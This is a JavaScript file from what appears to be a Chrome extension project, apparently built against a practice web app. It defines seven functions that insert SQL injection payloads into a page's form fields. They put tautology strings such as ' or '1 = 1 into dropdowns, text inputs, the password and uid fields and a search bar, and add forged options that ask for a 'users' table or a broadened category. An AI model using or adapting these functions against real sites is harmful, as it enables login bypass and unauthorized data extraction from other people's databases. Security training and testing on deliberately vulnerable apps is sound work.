'use strict';

// ----- Tactic 1 -----
function dropdownInject(){
  var dropdowns = document.getElementsByTagName('select');

  //If there are no dropdowns to inject, stop
  if (dropdowns.length == 0){
    //alert("There are no dropdowns to inject into.");
    return 1;
  }

  //Set injection tactic
  var injectionString = "<option value = \"\' or \'1 = 1\">Inject</option>"
  for (var i = 0, l = dropdowns.length; i < l; i++) {
    dropdowns[i].innerHTML = injectionString + dropdowns[i].innerHTML;
  }
  //alert("Injected");
}

// ----- Tactic 2 -----
function tfInject(){
  var tfs = document.getElementsByTagName('input');
  var injectionString = "\' or \'1 = 1"
  for (var i = 0; i < tfs.length; i++){
    tfs[i].value = injectionString;
  }
}

// ----- Tactic 3 -----
function loginPA(){
  var passwdbox = document.getElementById('password');
  passwdbox.value = "\' or \'1 = 1";
}

// ----- Tactic 4 -----
function accinfoUID(){
  var uid = document.getElementById('uid');
  uid.value = "\' or \'1 = 1";
}

// ----- Tactic 5 -----
function accinfoTCU(){
  var tableselect = document.getElementById('category');
  tableselect.innerHTML = "<option value = \"users\">Users</option>" + tableselect.innerHTML;
}

// ----- Tactic 6 -----
function groceryDump(){
  var searchbar = document.getElementById('searchinfo');
  searchbar.value = "\' or \'1 = 1";
}

// ----- Tactic 7 -----
function inventoryMC(){
  var catlist = document.getElementById('category');
  catlist.innerHTML = "<option value = \"frozen\' or category = \'produce\">Frozen and Produce</option>" + catlist.innerHTML;
}

module.exports.dropdownInject = dropdownInject
module.exports.tfInject = tfInject
module.exports.loginPA = loginPA
module.exports.accinfoUID = accinfoUID
module.exports.accinfoTCU = accinfoTCU
module.exports.groceryDump = groceryDump
module.exports.inventoryMC = inventoryMC


/*

Commented out due to Jest not understanding Chrome specific items.
These are just the way the popup connects to this page and calls them, similar to how we will call with Jest.

// Selection of injection stradegy
chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {
    if (request.message === "inject_to_dropdowns"){
      dropdownInject();
      chrome.runtime.sendMessage({"message": "Injection Completed"})
    }
    else if (request.message === "textfield_to_inject"){
      tfInject();
    }
    else if (request.message === "loginPA"){
      loginPA();
    }
    else if (request.message === "accinfoUID"){
      accinfoUID();
    }
    else if (request.message === "accinfoTCU"){
      accinfoTCU();
    }
    else if (request.message === "groceryDump"){
      groceryDump();
    }
    else if (request.message === "inventoryMC"){
      inventoryMC();
    }
  }
);
*/